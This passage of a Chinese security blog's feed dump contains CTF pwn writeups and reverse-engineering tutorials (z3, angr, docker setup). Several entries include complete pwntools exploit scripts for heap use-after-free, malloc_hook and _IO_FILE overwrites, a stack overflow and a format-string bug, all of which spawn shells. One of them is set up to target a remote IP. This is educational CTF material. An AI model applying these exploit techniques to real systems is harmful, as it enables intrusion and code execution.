push 0x80484f0─────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────00:0000│ esp 0xffffcc44 ◂— 0x101:0004│ 0xffffcc48 ◂— 0x202:0008│ 0xffffcc4c ◂— 0x303:000c│ 0xffffcc50 ◂— 0x104:0010│ 0xffffcc54 —▸ 0xffffcd14 —▸ 0xffffcf13 ◂— 0x6d6f682f ('/hom')05:0014│ 0xffffcc58 —▸ 0xffffcd1c —▸ 0xffffcf56 ◂— 'XDG_VTNR=7'06:0018│ 0xffffcc5c ◂— 0x007:001c│ 0xffffcc60 —▸ 0xf7f8f3dc (__exit_funcs) —▸ 0xf7f901e0 (initial) ◂— 0x0───────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────── ► f 0 8048445 main+30 f 1 f7df5637 __libc_start_main+247pwndbg&gt; nx is 0[Inferior 1 (process 10680) exited with code 07] 纳尼，程序执行完function函数之后，就输出x的值了，并退出了。看来我之前的思路完全错了，我还以为那个函数把1修改为0了，看来是劫持了程序的执行流，跳过了x=1;这个语句 接下里就分析一下那个函数是如何劫持程序执行流的,进入function函数进行调试12345678910111213141516171819202122232425262728293031323334353637380x08048422 in function ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────────────────── EAX 0xffffcc40 —▸ 0x804844a (main+35) ◂— add esp, 0xc EBX 0x0 ECX 0xffffcc80 ◂— 0x1 EDX 0x8048452 (main+43) ◂— add byte ptr [eax], al EDI 0xf7f8f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0 ESI 0xf7f8f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0 EBP 0xffffcc3c —▸ 0xffffcc68 ◂— 0x0 ESP 0xffffcc2c —▸ 0xf7fd3388 —▸ 0xf7ddd000 ◂— jg 0xf7ddd047 EIP 0x8048422 (function+23) ◂— mov dword ptr [eax], edx─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────────────── 0x8048414 &lt;function+9&gt; mov dword ptr [ebp - 4], eax 0x8048417 &lt;function+12&gt; mov eax, dword ptr [ebp - 4] 0x804841a &lt;function+15&gt; mov eax, dword ptr [eax] 0x804841c &lt;function+17&gt; lea edx, [eax + 8] 0x804841f &lt;function+20&gt; mov eax, dword ptr [ebp - 4] ► 0x8048422 &lt;function+23&gt; mov dword ptr [eax], edx &lt;0x8048452&gt; ##这里是关键 0x8048424 &lt;function+25&gt; nop 0x8048425 &lt;function+26&gt; leave 0x8048426 &lt;function+27&gt; ret ↓ 0x8048452 &lt;main+43&gt; add byte ptr [eax], al 0x8048454 &lt;main+45&gt; sub esp, 8─────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────00:0000│ esp 0xffffcc2c —▸ 0xf7fd3388 —▸ 0xf7ddd000 ◂— jg 0xf7ddd04701:0004│ 0xffffcc30 ◂— 0x800002:0008│ 0xffffcc34 —▸ 0xf7f8f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db003:000c│ 0xffffcc38 —▸ 0xffffcc40 —▸ 0x804844a (main+35) ◂— add esp, 0xc04:0010│ ebp 0xffffcc3c —▸ 0xffffcc68 ◂— 0x005:0014│ eax 0xffffcc40 —▸ 0x804844a (main+35) ◂— add esp, 0xc06:0018│ 0xffffcc44 ◂— 0x107:001c│ 0xffffcc48 ◂— 0x2───────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────── ► f 0 8048422 function+23 f 1 804844a main+35 f 2 f7df5637 __libc_start_main+247 可以看到下面这句汇编把eax寄存器指向的地址0x804844a (main+35)修改为了0x80484520x8048422 &lt;function+23&gt; mov dword ptr [eax], edx 我们配合着mian函数的汇编来看一下，0x8048844a这个地址是调用完function函数的下一个地址，也就相当于function的函数返回地址;但是这里被修改成了0x8048452，那这样就造成了执行完function函数之后，就跳转到0x8048452这个地址继续执行;从而跳过了0x0804844d &lt;+38&gt;: mov DWORD PTR [ebp-0xc],0x1 这个赋值语句123456789101112131415161718192021222324252627disassemble mainDump of assembler code for function main: 0x08048427 &lt;+0&gt;: lea ecx,[esp+0x4] 0x0804842b &lt;+4&gt;: and esp,0xfffffff0 0x0804842e &lt;+7&gt;: push DWORD PTR [ecx-0x4] 0x08048431 &lt;+10&gt;: push ebp 0x08048432 &lt;+11&gt;: mov ebp,esp 0x08048434 &lt;+13&gt;: push ecx 0x08048435 &lt;+14&gt;: sub esp,0x14 0x08048438 &lt;+17&gt;: mov DWORD PTR [ebp-0xc],0x0 0x0804843f &lt;+24&gt;: push 0x3 0x08048441 &lt;+26&gt;: push 0x2 0x08048443 &lt;+28&gt;: push 0x1 0x08048445 &lt;+30&gt;: call 0x804840b &lt;function&gt; 0x0804844a &lt;+35&gt;: add esp,0xc 0x0804844d &lt;+38&gt;: mov DWORD PTR [ebp-0xc],0x1 0x08048454 &lt;+45&gt;: sub esp,0x8 0x08048457 &lt;+48&gt;: push DWORD PTR [ebp-0xc] 0x0804845a &lt;+51&gt;: push 0x80484f0 0x0804845f &lt;+56&gt;: call 0x80482e0 &lt;printf@plt&gt; 0x08048464 &lt;+61&gt;: add esp,0x10 0x08048467 &lt;+64&gt;: nop 0x08048468 &lt;+65&gt;: mov ecx,DWORD PTR [ebp-0x4] 0x0804846b &lt;+68&gt;: leave 0x0804846c &lt;+69&gt;: lea esp,[ecx-0x4] 0x0804846f &lt;+72&gt;: ret End of assembler dump. 现在就很明显了，0x8048452-0x8048844a=8; 从c语言的角度来看ret=&amp;a-1;这句话就是取栈中 函数第一个参数 上面的函数返回地址的 地址指针；注意运算符优先级，先算术运算，后移位运算，最后位运算；ret=&amp;(a-1)然后(*ret)+=8，函数返回地址再加8，劫持了程序执行流。这个程序加8不是很好，应该改为加10更为严谨； 而64位程序是通过寄存器来传参的，ret取到的不是函数返回地址，就没办法劫持程序执行流了 64位的程序就不在演示调试了]]></content>
      <categories>
        <category>c</category>
      </categories>
      <tags>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第五空间线下pwn部分writeup]]></title>
    <url>%2F2019%2F10%2F05%2F%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8Bpwn%E9%83%A8%E5%88%86writeup%2F</url>
    <content type="text"><![CDATA[壹業标准的UAF漏洞题 思路 创建unsortedbin的chunk,free掉，然后再show，就能泄露libc地址 复写malloc_hook为one_gadget exp本地环境：ubuntu 16.04123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import *context.log_level='debug'r=process('./pwn1')#r=remote('0.0.0.0',10000)libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')libc_off = 0x7f7436b23b78-0x7f743675f000onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]print hex(libc_off)#pause()def add(size): r.recvuntil('&gt;&gt;') r.sendline('1') r.recvuntil(':') r.sendline(str(size))def show(idx): r.recvuntil('&gt;&gt;') r.sendline('2') r.recvuntil(':') r.sendline(str(idx))def edit(idx,cont): r.recvuntil('&gt;&gt;') r.sendline('3') r.recvuntil(':') r.sendline(str(idx)) r.recvuntil(':') r.sendline(cont)def delete(idx): r.recvuntil('&gt;&gt;') r.sendline('4') r.recvuntil(':') r.sendline(str(idx))add(0x60)#0add(0x60)#1add(0x60)#2add(0xa0)#3add(0x60)#4add(0x60)#5delete(3)#gdb.attach(r)show(3)r.recvuntil(':')leak=u64(r.recv(6).ljust(8,'\x00'))success(hex(leak))libc.address = leak- libc_offmallochook=libc.sym['__malloc_hook']one=libc.address+onegadgets[3]delete(0)edit(0,p64(mallochook-0x23))add(0x60)#6add(0x60)#7edit(7,'a'*0x13+p64(one))add(0x60)#8r.interactive() 三學整数溢出造成栈溢出 exp123456789101112131415161718#!/usr/bin/env python2#coding=utf-8from pwn import *context.log_level='debug'r=process('./pwn3')#r=remote("0.0.0.0",10001)sys=0x8048440sh=0x804a04cr.recvuntil(':') #namer.sendline('/bin/sh\x00')r.recvuntil(':') #choser.sendline('1')r.recvuntil(':') #sizer.sendline('-1')r.recvuntil('\n') #contentr.sendline('a'*0x5C+p32(0xffffffff)+p32(sys)+p32(0)+p32(sh))r.interactive() 四諦堆中存在调用puts函数的函数指针,而且还通过堆块来调用函数 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *context.log_level='debug'r= process('./pwn4')elf=ELF('./pwn4')libc=ELF("/lib/i386-linux-gnu/libc.so.6")def addnote(size,content): r.recvuntil(":") r.sendline("1") r.recvuntil(":") r.sendline(str(size)) r.recvuntil(":") r.sendline(content)def delnote(idx): r.recvuntil(":") r.sendline("2") r.recvuntil(":") r.sendline(str(idx))def printnote(idx): r.recvuntil(":") r.sendline("3") r.recvuntil(":") r.sendline(str(idx))got_puts=elf.got['puts']info('got_puts-&gt;'+hex(got_puts))pause()func=0x80491f2addnote(32,"0"*4)#0addnote(32,"1"*4)#1delnote(0)delnote(1)addnote(8,p32(func)+p32(got_puts))#2#gdb.attach(r)printnote(0)r.recvuntil(':')puts=u32(r.recv(4))success(hex(puts))pause()libc.address=puts-libc.sym['puts']sys=libc.sym['system']delnote(2)addnote(8,p32(sys)+';$0\x00')#3printnote(0)r.interactive() 五蘊格式化字符串漏洞，直接向unk_804c044写特定数，再输入相同的数，可用三种不同方法得到shell exp12345678910111213141516from pwn import *context.log_level='debug'r=process('./pwn5')#r=remote('0.0.0.0',10003)target=0x804c044#pay=p32(target)+p32(target+1)+p32(target+2)+p32(target+3)+'%10$hhn%11$hhn%12$hhn%13$hhn'#r.sendline(str(0x10101010))pay=p32(target)+'%012s'+'%10$n'pay=p32(target)+'a'*12+'%10$n'r.recvuntil(':')r.sendline(pay)r.recvuntil(':')r.sendline(str(0x10))r.interactive()]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[global_max_fast相关利用]]></title>
    <url>%2F2019%2F10%2F04%2Fglobal-max-fast%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[global_max_fasglobal_max_fast这个全局变量的作用是用来标志fastbin的大小的阈值，小于这个值的堆块会被认为是fastbin，使用fastbin的相应机制进行管理。在glibc-2.23中看下它的定义：1234#define set_max_fast(s) \ global_max_fast = (((s) == 0) \ ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))#define get_max_fast() global_max_fast set_max_fast初始化函数开始是在malloc_init_state调用的，可以看到这个宏定义的作用是设置global_max_fast默认值，默认值是0x80。 攻击方式改写global_max_fast为一个较大的值，然后释放一个较大的堆块时，由于fastbins数组空间是有限的，其相对偏移将会往后覆盖，如果释放堆块的size可控，就可实现往fastbins数组（main_arena）后的任意地址写入堆块的地址。 即利用global_max_fast进行相关的攻击 利用方式可结合unsorted bin attack来修改globa_max_fast为一个较大的值，前置条件是需要泄露libc的地址。然后通过地址与fastbin数组的偏移计算出所需free的堆块的size，释放相应的堆块，即可实现往该地址写入堆块的地址以进一步利用。 计算偏移的代码可以如下：123fastbin_ptr=libc_base+libc.symbols[&apos;main_arena&apos;]+8idx=(target_addr-fastbin_ptr)/8size=idx*0x10+0x20 此时要解决的事情是往哪里写以达到实现利用的目的。可能有很多的地方，理论上来说只要是main_arena结构体后面的是函数指针或是结构体指针的地址都可以，目前很容易能够预想到的是：12345_IO_list_allstdoutstdinstderr__free_hook 复写前面四个就是使用IO_file攻击那一套方法，伪造结构体来实现任意读任意写或者伪造vtable来实现house of orange攻击。 复写free_hook的话则需要一次uaf来修改释放进去的fd改成system或者one gadget，再将堆块申请出来，从而实现将free_hook改写成system或者one gadget。 实例 starctf2019-heap_master]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[z3求解器]]></title>
    <url>%2F2019%2F10%2F03%2Fz3%E6%B1%82%E8%A7%A3%E5%99%A8%2F</url>
    <content type="text"><![CDATA[简介Z3是一个微软出品的开源约束求解器，能够解决很多种情况下的给定部分约束条件寻求一组满足条件的解的问题（可以简单理解为解方程的感觉，虽然这么比喻其实还差距甚远，请勿吐槽），功能强大且易于使用。Z3 在工业应用中实际上常见于软件验证、程序分析等。然而由于功能实在强大，也被用于很多其他领域。CTF 领域来说，能够用约束求解器搞定的问题常见于密码题、二进制逆向、符号执行、Fuzzing 模糊测试等。此外，著名的二进制分析框架 angr 也内置了一个修改版的 Z3。 安装这里我用的是angr里面的z3，安装教程。 测试12345from z3 import *x = Int('x')y = Int('y')solve(x &gt; 2, y &lt; 10, x + 2*y == 7) 上面的例子中，定义了两个变量：x 和 y。类型为 Int（注意这里的 Int 可不是 C/C++ 里面包含上下界的 int，Z3 中的 Int 对应的就是数学中的整数，Z3 中的 BitVector 才对应到 C/C++ 中的 int）。 然后就调用了 solve 函数求解三个条件下的满足模型，这三个条件分别是 x 大于 2，y 小于 10，并且 x 加 2 个 y 等于 7。 运行一下结果： 12(angr) angr@36aeab92fea7:~/z3$ python test.py [y = 0, x = 7] ctf实例某比赛中的逆向题首先我们利用IDA去打开该文件，定位到关键点，发现关键函数如下：123456789101112131415161718192021222324252627282930313233343536373839signed __int64 sub_400766()&#123; if ( strlen((const char *)&amp;stru_6020A0) != 32 ) return 0LL; v3 = stru_6020A0.y1; v4 = stru_6020A0.y2; v5 = stru_6020A0.y3; v6 = stru_6020A0.y4; if ( stru_6020A0.x2 * (signed __int64)stru_6020A0.x1 - stru_6020A0.x4 * (signed __int64)stru_6020A0.x3 != 0x24CDF2E7C953DA56LL ) goto LABEL_15; if ( 3LL * stru_6020A0.x3 + 4LL * stru_6020A0.x4 - stru_6020A0.x2 - 2LL * stru_6020A0.x1 != 0x17B85F06 ) goto LABEL_15; if ( 3 * stru_6020A0.x1 * (signed __int64)stru_6020A0.x4 - stru_6020A0.x3 * (signed __int64)stru_6020A0.x2 != 0x2E6E497E6415CF3ELL ) goto LABEL_15; if ( 27LL * stru_6020A0.x2 + stru_6020A0.x1 - 11LL * stru_6020A0.x4 - stru_6020A0.x3 != 0x95AE13337LL ) goto LABEL_15; srand(stru_6020A0.x3 ^ stru_6020A0.x2 ^ stru_6020A0.x1 ^ stru_6020A0.x4); v1 = rand() % 50; v2 = rand() % 50; v7 = rand() % 50; v8 = rand() % 50; v9 = rand() % 50; v10 = rand() % 50; v11 = rand() % 50; v12 = rand() % 50; if ( v6 * v2 + v3 * v1 - v4 - v5 != 0xE638C96D3LL || v6 + v3 + v5 * v8 - v4 * v7 != 0xB59F2D0CBLL || v3 * v9 + v4 * v10 - v5 - v6 != 0xDCFE88C6DLL || v5 * v12 + v3 - v4 - v6 * v11 != 0xC076D98BBLL ) &#123;LABEL_15: result = 0LL; &#125; else &#123; result = 1LL; &#125; return result;&#125; 可以看得出来这个题目的目的就是找出满足方程的flag。我们可以很方便的把方程式列出来，但是求解对于一些数学不是很好的人来说简直就是噩梦，这时候Z3求解器就可以很方便的给我们帮助。我们按照题目的意思一步一步利用Z3求解器来求解：12345678910111213141516from z3 import *x1 = Int('x1')x2 = Int('x2')x3 = Int('x3')x4 = Int('x4')s = Solver() #创建一个通用求解器s.add( x2*x1-x4*x3 == 0x24CDF2E7C953DA56) #添加约束条件s.add( 3*x3+4*x4-x2-2*x1 == 0x17B85F06)s.add( 3*x1*x4-x3*x2 == 0x2E6E497E6415CF3E)s.add( 27*x2+x1-11*x4 - x3 == 0x95AE13337)print s.check() #检查是否有解，sat结果表示找到某个合适的解，unsat结果表示没有解m = s.model() #得到一组解，m为字典类型print mprint "traversing model..."for d in m.decls(): print "%s = %s" % (d.name(), m[d]) 第八届极客大挑战的REConvolution我们打开文件，也是比较直观的看到约束条件，我试着逆向了这个过程，花费了挺多的时间才得到答案，但是如果我们使用Z3Py来求解的话就会非常的快。 函数关键部分如下：123456789101112131415161718192021222324252627282930313233343536373839404142int __cdecl main(int argc, const char **argv, const char **envp)&#123; unsigned int ii; // esi unsigned int v4; // kr00_4 char flag_i; // bl unsigned int jj; // eax char *v7; // edx char v8; // cl int v9; // eax char xor_result[80]; // [esp+8h] [ebp-A4h] char flag[80]; // [esp+58h] [ebp-54h] sub_DC1020("Please input your flag: "); sub_DC1050("%40s", flag); memset(xor_result, 0, 0x50u); ii = 0; v4 = strlen(flag); if ( v4 ) &#123; do &#123; flag_i = flag[ii]; jj = 0; do &#123; v7 = &amp;xor_result[jj + ii]; v8 = flag_i ^ data1[jj++]; *v7 += v8; &#125; while ( jj &lt; 0x20 ); ++ii; &#125; while ( ii &lt; v4 ); &#125; v9 = strcmp(xor_result, (const char *)&amp;data2); if ( v9 ) v9 = -(v9 &lt; 0) | 1; if ( v9 ) puts("No, it isn't."); else puts("Yes, it is."); return 0;&#125; 我们利用Z3Py来进行变量的声明和约束的增加并进行求解12345678910111213141516171819202122232425#! /usr/bin/env python2#coding=utf-8from z3 import *s = Solver()X = [BitVec(('x%s' % i),8) for i in range(0x22) ] #生成34个8比特的数print Xdata1 = [0x21,0x22,0x23,0x24,0x25,0x26,0x27,0x28,0x29,0x2A,0x2B,0x2C,0x2D,0x2E,0x2F,0x3A,0x3B,0x3C,0x3D,0x3E,0x3F,0x40,0x5B,0x5C,0x5D,0x5E,0x5F,0x60,0x7B,0x7C,0x7D,0x7E]data2 = [0x72,0xE9,0x4D,0xAC,0xC1,0xD0,0x24,0x6B,0xB2,0xF5,0xFD,0x45,0x49,0x94,0xDC,0x10,0x10,0x6B,0xA3,0xFB,0x5C,0x13,0x17,0xE4,0x67,0xFE,0x72,0xA1,0xC7,0x04,0x2B,0xC2,0x9D,0x3F,0xA7,0x6C,0xE7,0xD0,0x90,0x71,0x36,0xB3,0xAB,0x67,0xBF,0x60,0x30,0x3E,0x78,0xCD,0x6D,0x35,0xC8,0x55,0xFF,0xC0,0x95,0x62,0xE6,0xBB,0x57,0x34,0x29,0x0E,3]xor_result = [0]*0x41for m in range(0,0x22): for n in range(0,0x20): xor_result[n+m] += X[m] ^ data1[n]for o in range(0,0x41): #循环添加约束条件 s.add(xor_result[o] == data2[o]) print s.check()m = s.model()print "traversing model..."flag=''for i in range(0,0x22): flag+=chr(int("%s" % (m[X[i]])))print flag 执行脚本如下:12345(angr) angr@36aeab92fea7:~/z3$ python exp2.py [x0, x1, x2, x3, x4, x5, x6, x7, x8, x9, x10, x11, x12, x13, x14, x15, x16, x17, x18, x19, x20, x21, x22, x23, x24, x25, x26, x27, x28, x29, x30, x31, x32, x33]sattraversing model...SYC&#123;4+mile+b3gin+with+sing1e+step&#125;]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[angr符号执行]]></title>
    <url>%2F2019%2F10%2F02%2Fangr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%2F</url>
    <content type="text"><![CDATA[简介符号执行简单来说就是用符号来模拟程序执行，在我看来就相当于暴力破解，比如一个程序要求你进行一个复杂的运算，每次动态调试只能输入一次，然而符合执行可以尽可能的遍历每一条路径，这样就方便了许多，官方学习文档。 安装这里不建议实体机安装，坑太多，直接上docker，安装教程 例题r100(defcamp)题目和脚本docker里面都有,将程序载入IDA静态分析，主函数如下12345678910111213141516171819202122 signed __int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; signed __int64 result; // rax char s; // [rsp+0h] [rbp-110h] unsigned __int64 v5; // [rsp+108h] [rbp-8h] v5 = __readfsqword(0x28u); printf("Enter the password: ", a2, a3); if ( !fgets(&amp;s, 255, stdin) ) return 0LL; if ( (unsigned int)sub_4006FD((__int64)&amp;s) ) &#123; puts("Incorrect password!"); result = 1LL; &#125; else &#123; puts("Nice!"); result = 0LL; &#125; return result;&#125; 加密函数如下，因为我们这里用符号执行来做，所以不进行算法分析1234567891011121314151617signed __int64 __fastcall sub_4006FD(__int64 a1)&#123; signed int i; // [rsp+14h] [rbp-24h] const char *v3; // [rsp+18h] [rbp-20h] const char *v4; // [rsp+20h] [rbp-18h] const char *v5; // [rsp+28h] [rbp-10h] v3 = "Dufhbmf"; v4 = "pG`imos"; v5 = "ewUglpt"; for ( i = 0; i &lt;= 11; ++i ) &#123; if ( (&amp;v3)[i % 3][2 * (i / 3)] - *(char *)(i + a1) != 1 ) return 1LL; &#125; return 0LL;&#125; 需要知道的是，程序有两个分支，输入密码后会进行判断，正确输出nice，错误输入wrong，我们希望的是输出nice，那么这里就可以进行用符号执行来做。先直观感受一下脚本，我们希望执行0x400844中的内容，不希望执行0x400855的内容，脚本如下：123456789101112131415import angrdef main(): p = angr.Project("r100", load_options=&#123;'auto_load_libs': False&#125;) # 加载程序 #约束执行的流程，0x400844为打印nice附近的地址，0x400855附近即为打印错误的地址 ex = p.surveyors.Explorer(find=(0x400844, ), avoid=(0x400855,)) ex.run() return ex.found[0].posix.dumps(0).strip('\0\n') # 打印found的第一个结果def test(): assert main() == 'Code_Talkers'if __name__ == '__main__': print main() crackme(ais3)同样载入IDA看主函数：12345678910111213141516171819int __cdecl main(int argc, const char **argv, const char **envp)&#123; int result; // eax if ( argc == 2 ) &#123; if ( (unsigned int)verify((__int64)argv[1]) ) puts("Correct! that is the secret key!"); else puts("I'm sorry, that's the wrong secret key!"); result = 0; &#125; else &#123; puts("You need to enter the secret key!"); result = -1; &#125; return result;&#125; 程序流程还是和上一题很相似，只是需要我们输入正确的参数从而得到flag，加密函数如下，我们同样不需要分析它123456789101112_BOOL8 __fastcall verify(__int64 a1)&#123; int i; // [rsp+14h] [rbp-4h] for ( i = 0; *(_BYTE *)(i + a1); ++i ) &#123; if ( encrypted[i] != ((unsigned __int8)((unsigned __int8)(*(_BYTE *)(i + a1) ^ i) &lt;&lt; ((i ^ 9) &amp; 3)) | (unsigned __int8)((signed int)(unsigned __int8)(*(_BYTE *)(i + a1) ^ i) &gt;&gt; (8 - ((i ^ 9) &amp; 3)))) + 8 ) return 0LL; &#125; return i == 23;&#125; 符号执行脚本如下：12345678910111213141516171819202122232425262728293031import angrimport claripy #处理用户输入def main(): project = angr.Project("./ais3_crackme") argv1 = claripy.BVS("argv1",100*8) #猜测flag长度小于100,乘8是转换为字节 initial_state = project.factory.entry_state(args=["./crackme1",argv1]) # 传递参数 sm = project.factory.simulation_manager(initial_state) #象征性地执行程序，直到达到指令指针的要求值 sm.explore(find=0x400602) #在这个指令程序将打印“正确的”消息 found = sm.found[0] #请求符号解算程序以字符串的形式获取处于到达状态的argv1的值 solution = found.solver.eval(argv1, cast_to=str) print repr(solution) solution = solution[:solution.find("\x00")] print solution return solutiondef test(): res = main() assert res == "ais3&#123;I_tak3_g00d_n0t3s&#125;"if __name__ == '__main__': print(repr(main()))]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[docker安装angr]]></title>
    <url>%2F2019%2F10%2F02%2Fdocker%E5%AE%89%E8%A3%85angr%2F</url>
    <content type="text"><![CDATA[前言angr不建议在实体机上安装，所以就安装到docker里面，官方容器里已经集成了angr，但安装的太慢。这里我选择了阿里云的容器镜像，本地环境为ubuntu16.64。 配置镜像加速器申请阿里云，修改daemon配置文件/etc/docker/daemon.json来使用加速器，把下方的registry-mirrors换成你的加速器地址。12345678sudo mkdir -p /etc/dockersudo tee /etc/docker/daemon.json &lt;&lt;-'EOF'&#123; "registry-mirrors": ["https://culfukli.mirror.aliyuncs.com"]&#125;EOFsudo systemctl daemon-reloadsudo systemctl restart docker 安装angr1docker pull registry.cn-hangzhou.aliyuncs.com/liujunjie/angr 安装完执行docker images 查看镜像，运行angr1docker run -it registry.cn-hangzhou.aliyuncs.com/liujunjie/angr 上述命令可以执行angr，但不会保存你在其中做的修改，应该用下列命令123456$docker run -itd registry.cn-hangzhou.aliyuncs.com/liujunjie/angr1d443841326281a8c5aee9cfad74893a5eded421eadc3eac2222f91bf15e3eb9$docker exec -it 1d44 bash #1d44为你的id的前四位root@1d4438413262:/# lsbin dev home lib64 mnt proc run srv tmp varboot etc lib media opt root sbin sys usr 这时可以输入命令了，与在linux中操作一样。但在root用户下import angr会失败，用su angr命令切换到angr用户即可。 测试进入到有例子的目录下，执行脚本,可以看到flag。1234567$cd /home/angr/angr-dev/angr-doc/examples/ais3_crackme$lsais3_crackme solve.py$python solve.py 'ais3&#123;I_tak3_g00d_n0t3s&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'ais3&#123;I_tak3_g00d_n0t3s&#125;'ais3&#123;I_tak3_g00d_n0t3s&#125;' 拷贝文件主机向docker中拷贝：1docker cp (本地文件路径) (docker container id):(容器中路径) docker向主机中拷贝：1docker cp (docker container id):(容器中路径) (本地文件路径) 容器操作查看容器进程1docker ps -a 打开容器1docker start container_id 关闭容器1dockr stop container_id 删除容器1docker rm container_id 导出容器1docker export container_id &gt; 容器快照名 镜像操作查看镜像1docker images 导入镜像1docker pull 镜像名称 运行images1docker run -it 镜像名称 bash 删除images1docker rmi image_id]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[学习pwn的心理路程]]></title>
    <url>%2F2019%2F10%2F02%2F%E5%AD%A6%E4%B9%A0pwn%E7%9A%84%E5%BF%83%E7%90%86%E8%B7%AF%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[(o≖◡≖)(๑•̀ㅂ•́)و✧(*￣ω￣)w(ﾟДﾟ)wo(≧口≦)oΣ( ° △ °|||)︴]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数字经济 pwn fkroman writeup]]></title>
    <url>%2F2019%2F09%2F28%2F%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%20pwn%20fkroman%20writeup%2F</url>
    <content type="text"><![CDATA[思路 利用堆溢出伪造堆块，并用uaf漏洞打_IO_FILE泄露出libc地址 再用uaf漏洞劫持malloc_hook为one_gadget exp本地环境：ubuntu 16.04，成功率不高123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#!/usr/bin/env python2from pwn import *context(log_level='debug', arch='amd64', os='linux')exe = './fkroman'lib = './libc-2.23.so'ip = '121.40.246.48'port = 9999elf = ELF(exe)libc = ELF(lib)def dbg(script=''): attach(io, gdbscript=script)def choice(idx): io.sendlineafter('Your choice: ', str(idx))def index(idx): io.sendlineafter('Index: ', str(idx))def add(idx, size): choice(1) index(idx) io.sendlineafter('Size: ', str(size))def dele(idx): choice(3) index(idx)def edit(idx, size, content): choice(4) index(idx) io.sendlineafter('Size: ', str(size)) io.sendafter('Content: ', content)# ------------------------------------------------LOCAL = 1iofile_off = [0x25dd,0xf5eb] #_IO_2_1_stderr_+157libc_off = 0x7ffff7dd2600-0x7ffff7a0d000onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]# ------------------------------------------------def exp(): add(0, 0x70-8) #0 add(1, 0x70-8) #1 add(2, 0x90-8) #2 add(3, 0x20-8) #3#-------------------leak libc--------------------- dele(1) dele(0) dele(2) edit(0, 1, p8(0xe0)) edit(1, 0x70, 'A'*0x68+p64(0x71)) edit(2, 2, p16(iofile_off[0])) #gdb.attach(io) add(4, 0x70-8) #0 #gdb.attach(io) add(5, 0x70-8) #2 #gdb.attach(io) add(6, 0x70-8) #target #gdb.attach(io) edit(6, 0x54, 'A'*3+p64(0)*6+p64(0x00000000fbad1800)+p64(0)*3+"\x00") #gdb.attach(io) io.recv(0x40) recv_addr=u64(io.recv(8)) log.info('libc-&gt;'+hex(recv_addr)) pause() libc.address = recv_addr - libc_off log.info(hex(libc.address))#-------------------malloc_hook------------------- add(7, 0x70-8) #2 edit(7, 0x70, 'B'*0x68+p64(0x21)) dele(7) info(hex(libc.sym['__malloc_hook']-0x23)) pause() edit(7, 8, p64(libc.sym['__malloc_hook']-0x23)) #0x7fefcf441aed _IO_wide_data_0+301 gdb.attach(io) add(8, 0x70-8) #2 add(9, 0x70-8) #target2 gdb.attach(io) info(hex(libc.address+onegadgets[1])) pause() edit(9, 0x1b, 'C'*0x13+p64(libc.address+onegadgets[1])) #0x7fefcf0c226a #gdb.attach(io) add(10, 0) io.interactive()# ------------------------------------------------if __name__ == '__main__': for i in range(100): try: if LOCAL: io = elf.process() env=&#123;"LD_PRELOAD": libc.path&#125; else: io = remote(ip, port) exp() except: print i 参考文章:https://mp.weixin.qq.com/s/Q4A6LwCd2E29uSXjMJs1dghttps://firmianay.gitbooks.io/ctf-all-in-one/doc/4.13_io_file.html]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn题的搭建]]></title>
    <url>%2F2019%2F09%2F25%2Fpwn%E9%A2%98%E7%9A%84%E6%90%AD%E5%BB%BA%2F</url>
